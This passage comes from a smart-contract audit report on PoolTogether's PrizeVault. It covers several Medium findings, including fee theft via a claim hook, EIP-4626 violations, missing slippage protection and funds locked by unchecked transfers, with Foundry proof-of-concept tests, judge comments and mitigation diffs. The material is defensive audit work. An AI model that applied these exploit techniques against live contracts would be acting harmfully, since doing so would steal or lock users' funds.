> 6. `PrizeVault(Claimabe):WinnerHook:beforeClaimPrize()` (with winner (attacker) params, no fees).<br>
>       - 6.1 Make `beforeClaimPrize` just return winner address at this time.
> 7. `PrizeVault(Claimabe):PrizePool::claimPrize([using no fees])` (with winner (attacker) params, no fees).<br>
>       - 7.1 After the winner (attacker) claimed his reward using `beforeClaimPrize()`, the function `beforeClaimPrize()` will return the winner address.<br>
>       - 7.2 `beforeClaimPrize` returned the winner address (note: `4`, `5`, `6` and `7` happens inside `beforeClaimPrize()` when the MEV searcher called claimer at `1`.
>       - 7.3 After this, the function will complete its execution (and the MEV will go to claim the prize of the winner and earn fees).
> 8. `PrizePool::claimPrize([using fees])` (with MEV searcher params, with fees).
> 9. Function return 0 as it is already claimed.
> 
> I highly encourage setting up the PoC and running it, I made a simulation of the normal state, and when the hook is used to steal rewards. By providing `-vvvv`, the call path will be viewed clearly.
> 
> All what I said here exists in my report, and I provided a runnable PoC that can be used by the judge to simulate the attack, it can be viewed by expanding the collapsed content from the triangle, and following setting up PoC instructions.
> 
> One additional thing: this issue is not a duplicate of issue `18`, my issue illustrates how the winner can steal the fees, and force the MEV searcher to pay for the gas.
> 
> As I illustrated in the title there are two Impacts:
> - The fees will get stolen from the caller of `Claimer contract` (MEV searcher), and the winner will get them himself.
> - The Winner will force the caller (MEV searcher) to pay for the gas, which can be considered griefing.

**[hansfriese (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-2008963116):**
 > Nice report! After checking again, I agree it's a valid concern and Medium is appropriate.

**[trmid (PoolTogether) confirmed and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-2013975691):**
 > Although this issue can be mitigated in the `PrizeVault` as described, we chose to update the `PrizePool` and `Claimer` contracts with logic that ensures a double prize claim will revert so that the griefer will not receive their prize. This removes any incentivization for the malicious hook to be set. (PRs linked for context)
> 
> By fixing the issue in the prize pool and claimer, we save gas by avoiding the two additional external calls added in the original mitigation.
> 
> `PrizePool.sol` mitigation [here](https://github.com/GenerationSoftware/pt-v5-prize-pool/pull/100) and `Claimer.sol` mitigation [here](https://github.com/GenerationSoftware/pt-v5-claimer/pull/28).

***

## [[M-02] `_maxYieldVaultWithdraw()` uses `yieldVault.convertToAssets()`](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/336)
*Submitted by [d3e4](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/336), also found by [d3e4](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/337)*

### Proof of Concept

```solidity
function _maxYieldVaultWithdraw() internal view returns (uint256) {
    return yieldVault.convertToAssets(yieldVault.maxRedeem(address(this)));
}
```

The above code uses `yieldVault.convertToAssets()` which, per EIP-4626, is only approximate. Especially, it might return too much, and thus `_maxYieldVaultWithdraw()` might return too much.
`_maxYieldVaultWithdraw()` is used [in `maxWithdraw()`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L405), [in `maxRedeem()`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L416), and [in `liquidatableBalanceOf()`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L639) which functions may thus return too much. In the case of `maxWithdraw()` and `maxRedeem()` this violates EIP-4626.

### Recommended Mitigation Steps

Use `yieldVault.previewRedeem(yieldVault.maxRedeem(address(this)))`.

### Assessed type

ERC4626

**[trmid (PoolTogether) confirmed and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/336#issuecomment-2018842026):**
 > Mitigation [here](https://github.com/GenerationSoftware/pt-v5-vault/pull/97). Also see [here](https://github.com/GenerationSoftware/pt-v5-vault/pull/96) for more details.

***

## [[M-03] `maxDeposit()` uses `yieldVault.maxDeposit()` but `_depositAndMint()` uses `yieldVault.mint()`](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/335)
*Submitted by [d3e4](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/335)*

`maxDeposit()` might return a value greater than can be deposited, violating EIP-4626.

### Proof of Concept

[`maxDeposit()` returns up to `yieldVault.maxDeposit(address(this))`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L374-L392). However, [`_depositAndMint()` deposits using `yieldVault.mint()`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L866) which may have a stricter limit than `yieldVault.deposit()`. In that case depositing `maxDeposit()` would revert, which violates EIP-4626.

### Recommended Mitigation Steps

Use `yieldVault.previewRedeem(yieldVault.maxMint())`.

### Assessed type

ERC4626

**[hansfriese (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/335#issuecomment-2004006563):**
 > It's a valid concern and QA is more appropriate due to the low impact.<br>
 > I will mark as grade-a with some unique issues.

**[d3e4 (warden) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/335#issuecomment-2008197541):**
 > Isn't a violation of EIP-4626, for a vault that claims to be compliant, at least a Medium severity because of the integration issues it implies?
> 
> Note that being [EIP-4626 compliant is explicitly stated in the README](https://github.com/code-423n4/2024-03-pooltogether?tab=readme-ov-file#:~:text=The%20new%20prize%20vault%20is%20designed%20to%20be%20fully%20compliant%20with%20the%20ERC4626%20specification) and that [adherence to this was listed as one of the Attack ideas](https://github.com/code-423n4/2024-03-pooltogether?tab=readme-ov-file#:~:text=PrizeVault%20ERC4626%20standard%20compliance).

**[hansfriese (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/335#issuecomment-2011275642):**
 > After checking again, I agree Medium is more appropriate as it may violate ERC4626 compliance.

**[trmid (PoolTogether) acknowledged and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/335#issuecomment-2019122769):**
 > After further evaluation, the suggested mitigation seems to cause issues in common ERC4626 yield vaults since `maxMint` commonly returns `type(uint256).max` and calling `previewRedeem` or `previewMint` with such a high value also commonly causes an overflow error on conversion.
> 
> As long as the yield vault `maxDeposit` function takes into account any internal supply limits, the current implementation is unlikely to have any compatibility issues and will be left as-is.

***

## [[M-04] Lack of Slippage Protection in `withdraw`/`redeem` Functions of the Vault](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/274)
*Submitted by [Aymen0909](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/274), also found by [cheatc0d3](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/356), [turvy\_fuzz](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/322), [trachev](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/297), [FastChecker](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/270), [Tripathi](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/249), [Abdessamed](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/178), [0xmystery](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/158), [btk](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/95), and [Giorgio](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/90)*

<https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L454-L472><br>
<https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L355-L366><br>
<https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L489-L508>

### Issue Description

When a user who has deposited assets into the PrizeVault wishes to withdraw (or redeem) them, they can do so by calling either the `withdraw` or `redeem` functions.

Under normal conditions in the vault, users expect to receive their full deposited asset amount back, as there is a 1:1 exchange ratio between the asset amount and shares.

However, if the underlying yield vault experiences a loss, this exchange rate will decrease. This is highlighted in the `previewWithdraw` function (or `previewRedeem`/`convertToAssets` function):

```solidity
function previewWithdraw(uint256 _assets) public view returns (uint256) {
    uint256 _totalAssets = totalAssets();

    // No withdrawals can occur if the vault controls no assets.
    if (_totalAssets == 0) revert ZeroTotalAssets();

    uint256 totalDebt_ = totalDebt();
    if (_totalAssets >= totalDebt_) {
        return _assets;
    } else {
        // Follows the inverse conversion of `convertToAssets`
        return _assets.mulDiv(totalDebt_, _totalAssets, Math.Rounding.Up);
    }
}

function convertToAssets(uint256 _shares) public view returns (uint256) {
    uint256 totalDebt_ = totalDebt();
    uint256 _totalAssets = totalAssets();
    if (_totalAssets >= totalDebt_) {
        return _shares;
    } else {
        // If the vault controls fewer assets than what has been deposited, a share will be worth a
        // proportional amount of the total assets. This can happen due to fees, slippage, or loss
        // of funds in the underlying yield vault.
        return _shares.mulDiv(_totalAssets, totalDebt_, Math.Rounding.Down);
    }
}
```

```solidity
function totalAssets() public view returns (uint256) {
    return yieldVault.convertToAssets(yieldVault.balanceOf(address(this))) + _asset.balanceOf(address(this));
}
```

As shown, if the underlying yield vault experiences a loss, the total assets of the vault given by `totalAssets()` will decrease and might go below the total shares value `totalDebt()`.

This will trigger the second `if` statement block, in which the calculated asset (or shares) amount will be converted using the ratio `totalAssets/totalDebt` (or its inverse for shares).

When a user redeems (or withdraws), if the yield vault experiences a loss while their transaction is pending (waiting in the mempool) and the total assets drop below the total vault debt, they will receive fewer assets after calling either the `withdraw`/`redeem` functions than they expected. Instead of a 1:1 ratio, they will use the current `totalAssets/totalDebt` ratio.

To illustrate this issue, consider the following scenario:

- In the vault, we have `totalAssets() = 51000` and `totalDebt() = 50000`.
- Bob previously deposited 1000 tokens and received 1000 shares in return.
- Bob wants to redeem 500 shares and expects to get his 500 tokens back since currently `totalAssets() > totalDebt()` (so there's a 1:1 ratio).
- While Bob's transaction is pending in the mempool, the yield vault experiences a loss, and `totalAssets() = 46000` drops below `totalDebt() = 50000`.
- When Bob's transaction goes through, he will receive: `(500 * 46000) / 50000 = 460 < 500`.
- Thus, instead of receiving 500 tokens, he only gets 460 back, resulting in a loss of 40 tokens.

If Bob had known that the yield vault had experienced a loss, he would have waited until the exchange rate increased again to withdraw his full amount.

This issue is also present in the `withdraw` function, but in that case, the user will be burning more shares to get the same amount and still incurring a loss.

### Impact

Both `withdraw`/`redeem` functions lack slippage protection, which can lead to users losing funds in the event of a yield vault loss.

### Tools Used

VS Code

### Recommended Mitigation

Both `withdraw`/`redeem` functions should include slippage protection parameters provided by the users (either minimum amount out for `redeem` function or maximum shares in for `withdraw` function).

### Assessed type

Context

**[trmid (PoolTogether) confirmed and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/274#issuecomment-1996007069):**
 > Providing depositors with slippage protection is a nice improvement! The suggested mitigation would break the ERC4626 spec requirements on the PrizeVault, so an alternate strategy will likely be used that either adds additional `deposit` and `withdraw` functions that have slippage params, or provides an external router that can provide this protection for the depositor.

**[d3e4 (warden) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/274#issuecomment-2008197099):**
 > Is this not a design suggestion rather than a bug, and should belong in Analysis?
> To remain EIP-4626 compliant a slippage protection would have to be implemented in entirely **new** functionality; not by amending already existing code. Therefore, it cannot be said that there is something wrong with the current code.

**[btk (warden) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/274#issuecomment-2010614231):**
 > @d3e4 - EIP-4626 states that: 
> 
> > If implementors intend to support EOA account access directly, they should consider adding an additional function call for deposit/mint/withdraw/redeem with the means to accommodate slippage loss or unexpected deposit/withdrawal limits, since they have no other means to revert the transaction if the exact output amount is not achieved.

**[hansfriese (judge) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/274#issuecomment-2011285407):**
 > I think it's eligible to be a Medium for the specific withdraw/redeem logic of `PrizeVault`. Will maintain it as a Medium.

**[trmid (PoolTogether) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/274#issuecomment-2013977761):**
 > Mitigation [here](https://github.com/GenerationSoftware/pt-v5-vault/pull/94).

***

## [[M-05] `yieldFeeBalance` wouldn't be claimed after calling `transferTokensOut()`](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/244)
*Submitted by [0xhunter20](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/244)*

`yieldFeeBalance` wouldn't be claimed after calling `transferTokensOut()` due to the twab supply limit.

### Proof of Concept

When `_tokenOut == address(this)`, `liquidatableBalanceOf()` mints shares to the receiver and accumulates `yieldFeeBalance` accordingly.

But when it checks the maximum liquidatable amount in [`liquidatableBalanceOf()`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L636), it validates the twap supply limit with the [`liquidYield`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L647) only; it might meet the supply limit while minting [`yieldFeeBalance`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L619) like the below:

- We assume `totalSupply = 6e28`, `yieldFeeBalance = 0`, `twabSupplyLimit = 2^96 - 1 = 7.9e28` and the vault has enough available yield.
- Then `liquidatableBalanceOf(_tokenOut = address(this))` will return `_maxAmountOut = 7.9e28 - 6e28 = 1.9e28` when [`_liquidYield > _maxAmountOut`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L653).
- After calling `transferTokensOut()` with `_amountOut = 1.9e28`, [`_yieldFee`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L675) will be added to `yieldFeeBalance` but it can't be claimed as we met the twap supply limit already.

### Recommended Mitigation Steps

[`liquidatableBalanceOf()`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L649) shouldn't apply `yieldFeePercentage` to compare with `_maxAmountOut` when `_tokenOut == address(this)`.

```solidity
    function liquidatableBalanceOf(address _tokenOut) public view returns (uint256) {
        uint256 _totalSupply = totalSupply();
        uint256 _maxAmountOut;
        if (_tokenOut == address(this)) {
            // Liquidation of vault shares is capped to the TWAB supply limit.
            _maxAmountOut = _twabSupplyLimit(_totalSupply);
        } else if (_tokenOut == address(_asset)) {
            // Liquidation of yield assets is capped at the max yield vault withdraw plus any latent balance.
            _maxAmountOut = _maxYieldVaultWithdraw() + _asset.balanceOf(address(this));
        } else {
            return 0;
        }

        // The liquid yield is computed by taking the available yield balance and multiplying it
        // by (1 - yieldFeePercentage), rounding down, to ensure that enough yield is left for the
        // yield fee.
        uint256 _liquidYield = _availableYieldBalance(totalAssets(), _totalDebt(_totalSupply));

        if (_tokenOut == address(this)) {
            if (_liquidYield >= _maxAmountOut) { //compare before applying yieldFeePercentage 
                _liquidYield = _maxAmountOut;
            }
            _liquidYield = _liquidYield.mulDiv(FEE_PRECISION - yieldFeePercentage, FEE_PRECISION);
        } else {
            _liquidYield = _liquidYield.mulDiv(FEE_PRECISION - yieldFeePercentage, FEE_PRECISION);

            if (_liquidYield >= _maxAmountOut) { //same as before
                _liquidYield = _maxAmountOut;
            }
        }

        return _liquidYield;
    }
```

### Assessed type

Invalid Validation

**[hansfriese (judge) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/244#issuecomment-2004128169):**
 > The impact is the same as [#91](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/91) but the flaw still exists after mitigating #91 because `liquidatableBalanceOf()` doesn't use the newly accumulated yield fees while checking `_twabSupplyLimit`.

**[trmid (PoolTogether) confirmed and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/244#issuecomment-2004174203):**
 > Similar to [#91](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/91), this issue outlines the need for the TWAB supply limit checks to account for the yield fee balance so that the entire yield fee balance is always available to be realized as shares.
>
> Mitigation [here](https://github.com/GenerationSoftware/pt-v5-vault/pull/93).

***

## [[M-06] Funds locked due to missing transfer check](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/235)
*Submitted by [CodeWasp](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/235), also found by [Al-Qa-qa](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/359), [d3e4](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/331), [0xmystery](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/208), and [Drynooo](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/121)*

All of the user's funds are unretrievably locked in the `PrizeVault` contract.

A combination of issues allows for the following scenario:

1. Alice invokes [`_withdraw(receiver, assets)`](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L925-L941) (via `burn()` or `withdraw()`).
2. The contract [computes the number of shares to redeem](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L933-L934), via `previewWithdraw(assets)`.
3. The contract [redeems as many shares](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L935-L936), but the ERC 4626-compliant vault returns fewer shares than expected. At this point, the contract holds fewer than `assets` tokens.
4. The contract [attempts to `transfer` assets to the receiver](https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L939). This fails due to insufficient funds, but the ERC 20-compliant token does not revert (only returns `false`).
5. At this point, Alice's assets are locked in the `PrizeVault` contract. They cannot be withdrawn at a later point, because the corresponding prize vault and yield vault shares have been burned.

The exploit relies on insufficient handling of two corner cases of [ERC-20](https://eips.ethereum.org/EIPS/eip-20) and [ERC-4246](https://eips.ethereum.org/EIPS/eip-4626):

- [ERC-20](https://eips.ethereum.org/EIPS/eip-20) does not stipulate that `transfer` must throw if the message sender holds insufficient balance. Instead, returning `false` is compliant with ERC-20 and implemented by many tokens, including [BAT](https://etherscan.io/token/0x0d8775f648430679a709e98d2b0cb6250d2887ef), [cUSDC](https://etherscan.io/token/0x39aa39c021dfbae8fac545936693ac917d5e7563), [EURS](https://etherscan.io/token/0xdb25f211ab05b1c97d595516f45794528a807ad8), [HuobiToken](https://etherscan.io/token/0x6f259637dcd74c767781e37bc6133cd6a68aa161), [ZRX](https://etherscan.io/token/0xe41d2489571d322189246dafa5ebde1f4699f498) and many more.
- [ERC-4626](https://eips.ethereum.org/EIPS/eip-4626) does not stipulate that `redeem(previewWithdraw(assets))` transfers at least `assets`. In particular, [`redeem(shares, ...)`](https://eips.ethereum.org/EIPS/eip-4626#redeem) only guarantees that exactly `shares` are burned. The only guaranteed way to gain a certain amount of assets is by calling [`withdraw(assets, ...)`](https://eips.ethereum.org/EIPS/eip-4626#withdraw).\

While this is the most standards-compliant scenario, a malicious vault could simply not transfer the required tokens on purpose, and still trigger the same effect as described above.

### Proof of Concept

We provide a proof of concept that results in all of Alice's assets locked in the `PrizeVault` contract and all her shares burned.

Place the file below in `test/unit/PrizeVault/PoCLockedFunds.t.sol` and run the test with:

```
    $ forge test --mt test_poc_lockedFundsOnLossyWithdrawal
```

<details>

```solidity
// Place in test/unit/PrizeVault/PoCLockedFunds.t.sol
pragma solidity ^0.8.24;

import { UnitBaseSetup } from "./UnitBaseSetup.t.sol";

import { IERC20, IERC4626 } from "openzeppelin/token/ERC20/extensions/ERC4626.sol";
import { ERC20PermitMock } from "../../contracts/mock/ERC20PermitMock.sol";
import { ERC4626Mock } from "openzeppelin/mocks/ERC4626Mock.sol";
import { Math } from "openzeppelin/utils/math/Math.sol";

// An ERC20-compliant token that does not throw on insufficient balance.
contract NoRevertToken is IERC20 {
    uint8   public decimals = 18;
    uint256 public totalSupply;

    mapping (address => uint)                      public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    constructor(uint _totalSupply) {
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function transfer(address dst, uint wad) external returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }
    function transferFrom(address src, address dst, uint wad) virtual public returns (bool) {
        if (balanceOf[src] < wad) return false;                        // insufficient src bal

        if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {
            if (allowance[src][msg.sender] < wad) return false;        // insufficient allowance
            allowance[src][msg.sender] = allowance[src][msg.sender] - wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);
        return true;
    }
    function approve(address usr, uint wad) virtual external returns (bool) {
        allowance[msg.sender][usr] = wad;
        emit Approval(msg.sender, usr, wad);
        return true;
    }
}


// An ERC4626-compliant (yield) vault.
// `withdraw(assets)` burns `assets * totalSupply / (totalAssets + 1)` shares.
// `redeem(shares)` transfers `shares * (totalAssets + 1) / (totalSupply + 1)` assets.
contract YieldVault is ERC4626Mock {
    using Math for uint256;
    constructor(address _asset) ERC4626Mock(_asset) {}

    function previewWithdraw(uint256 assets) public view virtual override returns (uint256) {
        return assets.mulDiv(totalSupply(), totalAssets() + 1);
    }
}

// Demonstrate that all of Alice's funds are locked in the PrizeVault,
// with all corresponding shares burned.
contract PoCLockedFunds is UnitBaseSetup {
    NoRevertToken asset;

    function setUpUnderlyingAsset() public view override returns (ERC20PermitMock) {
        return ERC20PermitMock(address(asset));
    }

    function setUpYieldVault() public override returns (IERC4626) {
        return new YieldVault(address(underlyingAsset));
    }

    function setUp() public override {
        return;
    }

    function test_poc_lockedFundsOnLossyWithdrawal() public {
        uint256 deposited = 1e18;

        // Mint 10^18 tokens and transfer them to Alice.
        asset = new NoRevertToken(deposited);
        super.setUp();
        asset.transfer(alice, deposited);

        // Alice holds all tokens, the yield vault and the price vaults are empty.
        assertEq(underlyingAsset.balanceOf(alice), deposited);
        assertEq(underlyingAsset.balanceOf(address(vault)), 0);
        assertEq(underlyingAsset.balanceOf(address(yieldVault)), 0);
        assertEq(yieldVault.totalSupply(), 0);
        assertEq(yieldVault.balanceOf(address(vault)), 0);
        assertEq(vault.totalSupply(), 0);
        assertEq(vault.balanceOf(alice), 0);

        // Alice enters the vault.
        vm.startPrank(alice);
        underlyingAsset.approve(address(vault), deposited);
        vault.deposit(deposited, alice);

        // All assets were transferred into the yield vault,
        // as many yield vault shares were minted to the prize vault, and
        // as many prize vault shares were minted to Alice.
        assertEq(underlyingAsset.balanceOf(alice), 0);
        assertEq(underlyingAsset.balanceOf(address(vault)), 0);
        assertEq(underlyingAsset.balanceOf(address(yieldVault)), deposited);
        assertEq(yieldVault.totalSupply(), deposited);
        assertEq(yieldVault.balanceOf(address(vault)), deposited);
        assertEq(vault.totalSupply(), deposited);
        assertEq(vault.balanceOf(alice), deposited);

        // Perform the lossy withdraw.
        vault.withdraw(deposited, alice, alice);

        // At this point Alice should've received all her assets back,
        // and all prize/yield vault shares should've been burned.
        // In contrast, no assets were transferred to Alice,
        // but (almost) all shares have been burned.
        assertEq(underlyingAsset.balanceOf(alice), 0);
        assertEq(underlyingAsset.balanceOf(address(vault)), 999999999999999999);
        assertEq(underlyingAsset.balanceOf(address(yieldVault)), 1);
        assertEq(yieldVault.totalSupply(), 1);
        assertEq(yieldVault.balanceOf(address(vault)), 1);
        assertEq(vault.totalSupply(), 0);
        assertEq(vault.balanceOf(alice), 0);

        // As a result, Alice's funds are locked in the vault;
        // she cannot even withdraw a single asset.
        vm.expectRevert();
        vault.withdraw(1, alice, alice);
        vm.expectRevert();
        vault.redeem(1, alice, alice);
    }
}
```

</details>

### Recommended Mitigation Steps

We recommend to fix both the ERC-20 transfer and ERC-4626 withdrawal.

For the first, it is easiest to rely on OpenZeppelin's [SafeERC20 `safeTransfer`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8cc7f2dcbf368f2a7ea491389dae41f01c16e352/contracts/token/ERC20/utils/SafeERC20.sol#L32-L38) function:

```diff
diff --git a/pt-v5-vault/src/PrizeVault.sol b/pt-v5-vault/src/PrizeVault.sol
index fafcff3..de69915 100644
--- a/pt-v5-vault/src/PrizeVault.sol
+++ b/pt-v5-vault/src/PrizeVault.sol
@@ -936,7 +936,7 @@ contract PrizeVault is TwabERC20, Claimable, IERC4626, ILiquidationSource, Ownab
             yieldVault.redeem(_yieldVaultShares, address(this), address(this));
         }
         if (_receiver != address(this)) {
-            _asset.transfer(_receiver, _assets);
+            _asset.safeTransfer(_receiver, _assets);
         }
     }
```

This already mitigates the erroneous locking of assets.

In addition, we recommend to ensure that at least the necessary amount of shares is withdrawn from the yield vault.
In the simplest form, this can be ensured by invoking `withdraw` directly:

```diff
diff --git a/pt-v5-vault/src/PrizeVault.sol b/pt-v5-vault/src/PrizeVault.sol
index fafcff3..9bb0653 100644
--- a/pt-v5-vault/src/PrizeVault.sol
+++ b/pt-v5-vault/src/PrizeVault.sol
@@ -930,10 +930,7 @@ contract PrizeVault is TwabERC20, Claimable, IERC4626, ILiquidationSource, Ownab
         // latent balance, we don't need to redeem any yield vault shares.
         uint256 _latentAssets = _asset.balanceOf(address(this));
         if (_assets > _latentAssets) {
-            // The latent balance is subtracted from the withdrawal so we don't withdraw more than we need.
-            uint256 _yieldVaultShares = yieldVault.previewWithdraw(_assets - _latentAssets);
-            // Assets are sent to this contract so any leftover dust can be redeposited later.
-            yieldVault.redeem(_yieldVaultShares, address(this), address(this));
+            yieldVault.withdraw(_assets - _latentAssets, address(this), address(this));
         }
         if (_receiver != address(this)) {
             _asset.transfer(_receiver, _assets);
```

If a tighter bound on redeemed shares is desired, the call to `previewWithdraw`/`redeem` should be followed by a `withdraw` of the outstanding assets:

```diff
diff --git a/pt-v5-vault/src/PrizeVault.sol b/pt-v5-vault/src/PrizeVault.sol
index fafcff3..622a7a6 100644
--- a/pt-v5-vault/src/PrizeVault.sol
+++ b/pt-v5-vault/src/PrizeVault.sol
@@ -934,6 +934,13 @@ contract PrizeVault is TwabERC20, Claimable, IERC4626, ILiquidationSource, Ownab
             uint256 _yieldVaultShares = yieldVault.previewWithdraw(_assets - _latentAssets);
             // Assets are sent to this contract so any leftover dust can be redeposited later.
             yieldVault.redeem(_yieldVaultShares, address(this), address(this));
+            
+            // Redeeming `_yieldVaultShares` may have transferred fewer than the required assets.
+            // Ask for the outstanding assets directly.
+            _latentAssets = _asset.balanceOf(address(this));
+            if (_assets > _latentAssets) {
+                yieldVault.withdraw(_assets - _latentAssets);
+            }
         }
         if (_receiver != address(this)) {
             _asset.transfer(_receiver, _assets);
```

### Assessed type

ERC20

**[trmid (PoolTogether) confirmed and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/235#issuecomment-1996001801):**
 > I would like to add that if a "compatible ERC4626 yield vault returns less assets than expected", then it is not actually ERC4626 compatible as these behaviors are required in the spec. That being said, there are likely to be some yield vaults that have errors like this and it is a good thing if we can protect against it without inhibiting the default experience!
> 
> The `safeTransfer` addition seems sufficient, while the other recommended mitigations are unnecessary and would break the "dust collector" strategy that the prize vault employs.
>
> Mitigation [here](https://github.com/GenerationSoftware/pt-v5-vault/pull/86).

**[hansfriese (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/235#issuecomment-2002771823):**
 > The impact is critical if `_asset.transfer()` fails silently and it will be mitigated from [this known issue](https://github.com/code-423n4/2024-03-pooltogether/blob/main/bot-report.md#m-02-erc-20-transfertransferfrom-return-values-should-be-checked).
> So according to [this criteria](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-similar-exploits-under-a-single-issue), this issue might be OOS if it's fully mitigated by adding `safeTransfer`.
> 
> But another impact is `withdraw()` might revert when `yieldVault.redeem()` returns fewer assets than requested and Medium is appropriate.

***

## [[M-07] `PrizeVault.maxDeposit()` doesn't take into account produced fees](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/91)
*Submitted by [pa6kuda](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/91), also found by [0xhunter20](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/243) and [Afriauditor](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/228)*

<https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L368-L392><br>
<https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L685><br>
<https://github.com/code-423n4/2024-03-pooltogether/blob/480d58b9e8611c13587f28811864aea138a0021a/pt-v5-vault/src/PrizeVault.sol#L619>

### Summary

Currently, `PrizeVault.maxDeposit()` calculates the maximum possible amount of deposit without taking into account produced fees. That means if there is already maxed deposited amount of asset that is calculated by the current implementation in `PrizeVault.maxDeposit()`, `yieldFeeRecipient` can't withdraw shares with `PrizeVault.claimYieldFeeShares()` because in that case `_mint()` will revert because of overflow. A lot of low-price tokens can exceed the limit of `type(uint96).max` with ease. For example, to make a deposit with `maxDeposit()` value with LADYS token it's needed only `$13568` (as of 08-03-2024).

### Impact

If a user makes a maximum allowed deposit that is calculated by the current implementation of `PrizeVault.maxDeposit()`, `yieldFeeRecipient` can't withdraw fees if they are available.

### Proof of Concept

Add this test to `PrizeVault.t.sol` and run with:

```
    forge test --match-contract PrizeVaultTest --match-test testMaxDeposit_CalculatesWithoutTakingIntoAccountGeneratedFees
```

```solidity
    function _deposit(address account, uint256 amount) private {
        underlyingAsset.mint(account, amount);
        vm.startPrank(account);
        underlyingAsset.approve(address(vault), amount);
